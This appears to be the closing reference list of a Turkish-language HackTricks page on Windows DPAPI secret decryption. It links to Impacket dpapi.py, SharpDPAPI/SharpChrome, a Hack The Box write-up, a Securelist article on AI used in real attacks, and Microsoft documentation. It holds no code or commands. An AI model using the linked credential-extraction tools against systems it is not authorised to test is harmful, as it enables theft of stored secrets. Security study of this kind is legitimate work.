- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL kötüye kullanımı, KeePassXC Argon2 kırma ve DPAPI şifresini çözerek DC yöneticisi olma](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI sahada: kuruluşlara yönelik gerçek saldırılarda AI kullanımı](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - Şifrelenmiş Report Server verilerini depolama](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - RSReportServer.config yapılandırma dosyası](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
